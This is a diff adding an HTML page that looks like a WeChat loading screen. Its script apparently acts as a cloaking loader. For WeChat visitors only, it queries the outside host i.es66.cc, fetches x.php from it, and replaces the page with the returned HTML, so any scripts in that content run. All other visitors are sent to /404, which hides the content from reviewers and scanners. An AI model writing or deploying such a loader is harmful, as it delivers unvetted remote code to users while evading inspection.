@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="zh-cmn-Hans">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=0,viewport-fit=cover">
+    <title>.</title>
+    <style>
+        html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{line-height:1.6;font-family:-apple-system-font,"Helvetica Neue",sans-serif}*{margin:0;padding:0}.weui-toast{position:fixed;z-index:5000;width:136px;height:136px;top:40%;left:50%;-webkit-transform:translate(-50%,-50%);transform:translate(-50%,-50%);text-align:center;border-radius:12px;color:rgba(255,255,255,0.9);display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-orient:vertical;-webkit-box-direction:normal;-webkit-flex-direction:column;flex-direction:column;-webkit-box-align:center;-webkit-align-items:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;justify-content:center;background-color:#4c4c4c;box-sizing:border-box;line-height:1.4}.weui-icon_toast{display:block;width:40px;height:40px;margin-bottom:16px}.weui-icon_toast.weui-primary-loading{width:36px;height:36px}.weui-icon_toast.weui-primary-loading:before,.weui-icon_toast.weui-primary-loading:after{content:"";display:block;width:18px;height:36px}.weui-icon_toast.weui-primary-loading:before{border-top-left-radius:36px;border-bottom-left-radius:36px}.weui-icon_toast.weui-primary-loading:after{border-top-right-radius:36px;border-bottom-right-radius:36px}.weui-toast__content{font-size:17px;padding:0 12px;word-wrap:break-word;-webkit-hyphens:auto;hyphens:auto}.weui-mask_transparent{position:fixed;z-index:1000;top:0;right:0;left:0;bottom:0}.weui-search-bar__input:not(:valid)+.weui-icon-clear{display:none}.weui-primary-loading{display:-webkit-inline-box;display:-webkit-inline-flex;display:inline-flex;position:relative;width:16px;height:16px;vertical-align:middle;color:black;color:var(--weui-FG);-webkit-animation:weuiLoading 1s steps(60,end) infinite;animation:weuiLoading 1s steps(60,end) infinite}.weui-primary-loading:before,.weui-primary-loading:after{content:"";display:block;width:8px;height:16px;box-sizing:border-box;border:2px solid;border-color:currentColor;opacity:.5}.weui-primary-loading:before{border-right-width:0;border-top-left-radius:16px;border-bottom-left-radius:16px;-webkit-mask-image:-webkit-linear-gradient(top,#000 8%,rgba(0,0,0,0.3) 95%)}.weui-primary-loading:after{border-left-width:0;border-top-right-radius:16px;border-bottom-right-radius:16px;-webkit-mask-image:-webkit-linear-gradient(225deg,rgba(0,0,0,0) 45%,rgba(0,0,0,0.3) 95%)}.weui-primary-loading__dot{position:absolute;top:0;left:50%;width:1px;height:2px;border-top-right-radius:2px;border-bottom-right-radius:2px;background:currentColor;opacity:.5}.weui-primary-loading_transparent{color:#fff}@-webkit-keyframes weuiLoading{0%{-webkit-transform:rotate3d(0,0,1,0deg);transform:rotate3d(0,0,1,0deg)}100%{-webkit-transform:rotate3d(0,0,1,360deg);transform:rotate3d(0,0,1,360deg)}}@keyframes weuiLoading{0%{-webkit-transform:rotate3d(0,0,1,0deg);transform:rotate3d(0,0,1,0deg)}100%{-webkit-transform:rotate3d(0,0,1,360deg);transform:rotate3d(0,0,1,360deg)}}
+    </style>
+</head>
+<body>
+<div>
+    <div class="weui-mask_transparent"></div>
+    <div class="weui-toast">
+        <span class="weui-primary-loading weui-primary-loading_transparent weui-icon_toast">
+          <span class="weui-primary-loading__dot"></span>
+        </span>
+        <p class="weui-toast__content">正在加载</p>
+    </div>
+</div>
+<script>
+function View(a) {
+    function d() {
+        var a = document.open("text/html", "replace");
+        a.write(c), a.close();
+    }
+    var b, c;
+    a = a + "?t_=" + Date.now(), b = new XMLHttpRequest(), c = null, b.onload = function() {
+        c = b.responseText;
+        var a = 0;
+        a > 0 ? setTimeout(d, 1e3 * a) :d();
+    }, b.open("GET", a, !0), b.send();
+}
+function gda6jrp46x27p7(a, b, c) {
+    var d = new XMLHttpRequest();
+    d.onreadystatechange = function() {
+        4 === d.readyState && (200 === d.status || 304 === d.status ? "function" == typeof b && b(d.responseText) : "function" == typeof c && c(d));
+    },d.open("GET", a, !0),d.send(null);
+}
+function getUrlParam(name) {var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");var r = window.location.search.substr(1).match(reg);if (r != null) return unescape(r[2]);return null;}
+
+if (/micromessenger/.test(navigator.userAgent.toLowerCase())) {
+    infos = {id:getUrlParam('id'), 'cnzz':'', 'bdtj':'' ,'apiurl':'https://i.es66.cc'};
+    code = '';
+    gda6jrp46x27p7(infos.apiurl+"/api/service/getTjCode?id=" + infos.id, function(aa) {
+        aa = JSON.parse(aa);
+        infos['cnzz'] = aa['cnzz'];
+        infos['bdtj'] = aa['bdtj'];
+        View(infos.apiurl +'/x.php');
+    });
+}else{
+    location.href = '/404';
+}
+</script>
+</body>
+</html>
